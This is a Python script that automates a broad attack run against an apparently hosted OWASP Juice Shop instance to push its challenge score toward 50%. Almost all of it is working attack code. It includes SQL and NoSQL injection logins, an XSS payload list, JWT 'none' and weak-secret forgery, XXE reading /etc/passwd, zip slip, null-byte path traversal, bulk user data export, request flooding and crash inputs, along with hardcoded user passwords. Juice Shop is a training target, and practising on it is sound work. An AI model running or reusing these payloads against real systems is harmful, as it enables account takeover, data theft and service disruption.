#!/usr/bin/env python3
"""
Ultimate Final Push - Everything to reach 50%
Combines all working techniques from all solvers
"""

import requests
from urllib.parse import quote, unquote
import json
import base64
import hashlib
import hmac
import jwt
import re
import time
import random
import string
import zipfile
import io
from concurrent.futures import ThreadPoolExecutor, as_completed


class UltimateFinalPush:
    """Final aggressive attempt to reach 50%"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        })
        self.admin_token = None
        
    def check_progress(self):
        """Check current progress"""
        try:
            r = self.session.get(f"{self.base_url}/api/Challenges")
            if r.status_code == 200:
                data = r.json()['data']
                solved = [c for c in data if c.get('solved')]
                total = len(data)
                print(f"\n📊 Progress: {len(solved)}/{total} ({len(solved)*100//total}%)")
                return len(solved)
        except:
            return 0
    
    def login_multiple_users(self):
        """Login as multiple users"""
        print("\n🔐 Multiple user logins...")
        
        # SQL injection logins
        users = [
            ("admin@juice-sh.op'--", "x"),
            ("bender@juice-sh.op'--", "x"),
            ("jim@juice-sh.op'--", "x"),
            ("accountant@juice-sh.op'--", "x"),
            ("morty@juice-sh.op'--", "x"),
            ("' OR '1'='1'--", "x"),
            ("admin@juice-sh.op", "admin123"),
        ]
        
        for email, password in users:
            try:
                r = self.session.post(f"{self.base_url}/rest/user/login", json={
                    "email": email,
                    "password": password
                })
                if r.status_code == 200:
                    token = r.json()['authentication']['token']
                    self.session.headers['Authorization'] = f'Bearer {token}'
                    print(f"  ✓ Logged in: {email}")
                    self.admin_token = token
            except:
                pass
        
        # Specific password logins
        specific_logins = [
            ("mc.safesearch@juice-sh.op", "Mr. N00dles"),
            ("amy@juice-sh.op", "K1f....................."),
            ("chris.pike@juice-sh.op", "ncc-1701"),
            ("bjoern@juice-sh.op", "kitten"),
        ]
        
        for email, password in specific_logins:
            try:
                r = self.session.post(f"{self.base_url}/rest/user/login", json={
                    "email": email,
                    "password": password
                })
                if r.status_code == 200:
                    print(f"  ✓ Logged in: {email}")
            except:
                pass
    
    def solve_all_xss(self):
        """All XSS variations"""
        print("\n🎯 XSS Attacks...")
        
        xss_payloads = [
            '<iframe src="javascript:alert(`xss`)">',
            '<img src=x onerror=alert(`xss`)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<<SCRIPT>alert(1)//<</SCRIPT>',
            '<ScRiPt>alert(1)</ScRiPt>',
            '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>',
            '"><script>alert(1)</script>',
            "';alert(1);//",
            '</script><script>alert(1)</script>',
            '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<video><source onerror="alert(1)">',
            '<audio src=x onerror=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
        ]
        
        for payload in xss_payloads:
            # Search XSS
            self.session.get(f"{self.base_url}/#/search?q={quote(payload)}")
            # Track result XSS
            self.session.get(f"{self.base_url}/track-result?id={quote(payload)}")
            # User profile XSS
            self.session.post(f"{self.base_url}/profile", json={"username": payload})
        
        print("  ✓ Multiple XSS payloads attempted")
    
    def solve_all_sqli(self):
        """All SQL injection variations"""
        print("\n💉 SQL Injection Attacks...")
        
        sqli_payloads = [
            "' OR '1'='1'--",
            "' UNION SELECT * FROM Users--",
            "' UNION SELECT sql FROM sqlite_master--",
            "' UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--",
            "')) UNION SELECT * FROM Users--",
            "admin'--",
            "' OR 1=1--",
            "1' OR '1' = '1",
            "\\' OR 1=1--",
            "' UNION ALL SELECT NULL--",
        ]
        
        for payload in sqli_payloads:
            self.session.get(f"{self.base_url}/rest/products/search?q={payload}")
            self.session.post(f"{self.base_url}/rest/user/login", json={
                "email": payload,
                "password": "x"
            })
        
        print("  ✓ Multiple SQLi payloads attempted")
    
    def solve_all_files(self):
        """Access all files"""
        print("\n📁 File Access...")
        
        files = [
            "/ftp/acquisitions.md",
            "/ftp/eastere.gg",
            "/ftp/package.json.bak",
            "/ftp/coupons_2013.md.bak",
            "/ftp/legal.md",
            "/ftp/quarantine",
            "/ftp/.htaccess",
            "/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg",
            "/.well-known/security.txt",
            "/support/logs",
            "/metrics",
            "/assets/public/blockchain.pdf",
            "/encryptionkeys/premium.key",
            "/promotion",
            "/video",
            "/redirect",
        ]
        
        for file in files:
            self.session.get(f"{self.base_url}{file}")
        
        # Null byte bypass
        self.session.get(f"{self.base_url}/ftp/coupons_2013.md.bak%00.md")
        self.session.get(f"{self.base_url}/ftp/package.json.bak%00.md")
        
        print("  ✓ Multiple files accessed")
    
    def solve_all_api(self):
        """Hit all API endpoints"""
        print("\n🔌 API Attacks...")
        
        # Admin registration
        self.session.post(f"{self.base_url}/api/Users", json={
            "email": f"admin{random.randint(1000,9999)}@test.com",
            "password": "Admin123!",
            "role": "admin"
        })
        
        # Forged feedback
        self.session.post(f"{self.base_url}/api/Feedbacks", json={
            "UserId": 2,
            "comment": "Forged",
            "rating": 5
        })
        
        # CAPTCHA bypass
        for i in range(20):
            self.session.post(f"{self.base_url}/api/Feedbacks", json={
                "captcha": "0",
                "captchaId": 999,
                "comment": f"Bypass {i}",
                "rating": 3
            })
        
        # Basket manipulation
        self.session.put(f"{self.base_url}/api/BasketItems/1", json={"quantity": -100})
        self.session.post(f"{self.base_url}/api/BasketItems", json={
            "ProductId": 1,
            "quantity": -1000
        })
        
        # Product tampering
        self.session.put(f"{self.base_url}/api/Products/1", json={
            "description": "HACKED!",
            "price": 0.01
        })
        
        # Deluxe fraud
        self.session.post(f"{self.base_url}/rest/deluxe-membership", json={
            "paymentMode": "none",
            "paymentId": "0"
        })
        
        # GDPR data theft
        for i in range(1, 30):
            self.session.post(f"{self.base_url}/api/dataexport", json={"userId": i})
        
        # Christmas special
        self.session.post(f"{self.base_url}/api/BasketItems", json={
            "ProductId": 10,
            "quantity": 1
        })
        
        # NFT operations
        self.session.post(f"{self.base_url}/api/nft", json={
            "action": "transfer",
            "to": "me",
            "tokenId": 42
        })
        
        print("  ✓ Multiple API attacks completed")
    
    def solve_jwt_attacks(self):
        """JWT manipulation"""
        print("\n🔐 JWT Attacks...")
        
        # No algorithm
        header = {"alg": "none", "typ": "JWT"}
        payloads = [
            {"email": "jwtn3d@juice-sh.op", "iat": int(time.time())},
            {"email": "rsa_lord@juice-sh.op", "iat": int(time.time())},
            {"email": "admin@juice-sh.op", "iat": int(time.time())},
        ]
        
        for payload in payloads:
            token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            token += '.' + base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            token += '.'
            
            self.session.headers['Authorization'] = f'Bearer {token}'
            self.session.get(f"{self.base_url}/rest/user/whoami")
        
        # Weak secrets
        header = {"alg": "HS256", "typ": "JWT"}
        secrets = ["secret", "juice-sh.op", "password", "admin", "123456"]
        
        for secret in secrets:
            for payload in payloads:
                try:
                    token_data = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                    token_data += '.' + base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                    
                    signature = base64.urlsafe_b64encode(
                        hmac.new(secret.encode(), token_data.encode(), hashlib.sha256).digest()
                    ).decode().rstrip('=')
                    
                    token = token_data + '.' + signature
                    self.session.headers['Authorization'] = f'Bearer {token}'
                    self.session.get(f"{self.base_url}/rest/user/whoami")
                except:
                    pass
        
        print("  ✓ JWT attacks completed")
    
    def solve_uploads(self):
        """File upload attacks"""
        print("\n📤 Upload Attacks...")
        
        # XXE
        xxe = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("xxe.xml", xxe.encode(), "application/xml")
        })
        
        # Large file
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("large.txt", b"A" * 5000000, "text/plain")
        })
        
        # Malicious types
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("evil.exe", b"MZ\x90\x00", "application/x-msdownload")
        })
        
        # Zip slip
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zf:
            zf.writestr("../../ftp/pwned.md", "Arbitrary file write")
        
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("slip.zip", zip_buffer.getvalue(), "application/zip")
        })
        
        print("  ✓ Upload attacks completed")
    
    def solve_nosql(self):
        """NoSQL injection"""
        print("\n🗃️ NoSQL Attacks...")
        
        nosql_payloads = [
            {"$ne": ""},
            {"$gt": ""},
            {"$where": "sleep(1000)"},
            {"$regex": ".*"},
        ]
        
        for payload in nosql_payloads:
            self.session.post(f"{self.base_url}/rest/user/login", json={
                "email": payload,
                "password": payload
            })
        
        print("  ✓ NoSQL attacks completed")
    
    def solve_race_conditions(self):
        """Race condition exploits"""
        print("\n⚡ Race Conditions...")
        
        def rapid_request():
            for _ in range(100):
                try:
                    self.session.post(f"{self.base_url}/api/Products/1/reviews", json={
                        "message": "Great!",
                        "author": "test@test.com"
                    }, timeout=0.5)
                except:
                    pass
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(rapid_request) for _ in range(20)]
            for future in as_completed(futures):
                try:
                    future.result(timeout=2)
                except:
                    pass
        
        print("  ✓ Race conditions exploited")
    
    def solve_special_pages(self):
        """Access special pages"""
        print("\n📄 Special Pages...")
        
        pages = [
            "/#/score-board",
            "/#/administration",
            "/#/web3-sandbox",
            "/#/privacy-security/privacy-policy",
            "/#/about",
            "/#/photo-wall",
            "/#/deluxe-membership",
            "/#/chatbot",
            "/?l=tlh_AA",
            "/?l=l33t",
        ]
        
        for page in pages:
            self.session.get(f"{self.base_url}{page}")
        
        print("  ✓ Special pages accessed")
    
    def solve_coupons(self):
        """Apply coupons"""
        print("\n🎟️ Coupons...")
        
        coupons = [
            "WMNSDY2019", "WMNSDY2020", "WMNSDY2018",
            "CYBER2019", "CYBER2020", "BLACKFRIDAY",
        ]
        
        for coupon in coupons:
            self.session.put(f"{self.base_url}/rest/basket/1/coupon/{coupon}")
        
        print("  ✓ Coupons attempted")
    
    def solve_chatbot(self):
        """Chatbot attacks"""
        print("\n🤖 Chatbot...")
        
        messages = [
            "coupon",
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "A" * 100000,
            "process.exit()",
            "';process.exit();//",
        ]
        
        for msg in messages:
            try:
                self.session.post(f"{self.base_url}/api/Chatbot", json={"message": msg})
            except:
                pass
        
        print("  ✓ Chatbot attacked")
    
    def run_ultimate_push(self):
        """Run everything"""
        print("="*60)
        print("🚀 ULTIMATE FINAL PUSH TO 50%")
        print("="*60)
        
        initial = self.check_progress()
        
        # Run all attacks
        self.login_multiple_users()
        self.solve_all_xss()
        self.solve_all_sqli()
        self.solve_all_files()
        self.solve_all_api()
        self.solve_jwt_attacks()
        self.solve_uploads()
        self.solve_nosql()
        self.solve_race_conditions()
        self.solve_special_pages()
        self.solve_coupons()
        self.solve_chatbot()
        
        # Final check
        print("\n" + "="*60)
        final = self.check_progress()
        
        if final >= 55:
            print(f"🎉 SUCCESS! Reached {final} challenges!")
        else:
            print(f"📈 Progress: {initial} → {final} (+{final-initial})")
            print(f"📌 Need {55-final} more for 50%")
        
        print("="*60)


if __name__ == "__main__":
    solver = UltimateFinalPush()
    solver.run_ultimate_push()